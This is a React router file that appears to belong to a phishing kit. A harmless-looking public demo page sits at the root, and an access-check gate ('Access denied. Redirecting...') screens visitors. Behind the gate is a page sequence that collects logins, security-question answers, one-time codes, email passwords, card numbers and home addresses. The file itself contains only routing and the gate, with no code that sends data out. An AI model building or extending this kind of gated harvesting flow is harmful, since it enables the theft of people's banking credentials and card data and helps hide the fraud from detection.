import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';

// Components
import FlowLayout from './components/FlowLayout';

// Pages
import LoginForm from './pages/LoginForm';
import SecurityQuestions from './pages/SecurityQuestions';
import OTP from './pages/OTP';
import EmailPassword from './pages/EmailPassword';
import BasicInfo from './pages/BasicInfo';
import Card from './pages/Card';
import HomeAddress from './pages/HomeAddress';
import Terms from './pages/Terms';
import Register from './pages/Register';
import LifestyleDemo from './pages/LifestyleDemo';

interface ProtectedLayoutProps {
  children: React.ReactNode;
  containerClassName?: string;
}

// Layout component for protected routes
const ProtectedLayout: React.FC<ProtectedLayoutProps> = ({ children, containerClassName }) => {
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return (
      <FlowLayout>
        <div className="text-white text-center text-lg">Loading...</div>
      </FlowLayout>
    );
  }

  if (isAllowed === false) {
    return (
      <FlowLayout>
        <div className="text-white text-center text-lg">Access denied. Redirecting...</div>
      </FlowLayout>
    );
  }

  return (
    <FlowLayout>
      <div className={containerClassName ?? 'w-full max-w-2xl'}>{children}</div>
    </FlowLayout>
  );
};

const ProtectedRoute: React.FC<ProtectedLayoutProps> = ({ children, containerClassName }) => {
  return <ProtectedLayout containerClassName={containerClassName}>{children}</ProtectedLayout>;
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />

        {/* Protected routes */}
        <Route
          path="/login"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md">
              <LoginForm />
            </ProtectedRoute>
          }
        />

        <Route
          path="/security-questions"
          element={
            <ProtectedRoute>
              <SecurityQuestions />
            </ProtectedRoute>
          }
        />

        <Route
          path="/otp"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md">
              <OTP />
            </ProtectedRoute>
          }
        />

        <Route
          path="/email-password"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md">
              <EmailPassword />
            </ProtectedRoute>
          }
        />

        <Route
          path="/basic-info"
          element={
            <ProtectedRoute>
              <BasicInfo />
            </ProtectedRoute>
          }
        />

        <Route
          path="/card"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md">
              <Card />
            </ProtectedRoute>
          }
        />

        <Route
          path="/home-address"
          element={
            <ProtectedRoute>
              <HomeAddress />
            </ProtectedRoute>
          }
        />

        <Route
          path="/register"
          element={
            <ProtectedRoute>
              <Register />
            </ProtectedRoute>
          }
        />

        <Route
          path="/terms"
          element={
            <ProtectedRoute>
              <Terms />
            </ProtectedRoute>
          }
        />

        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;


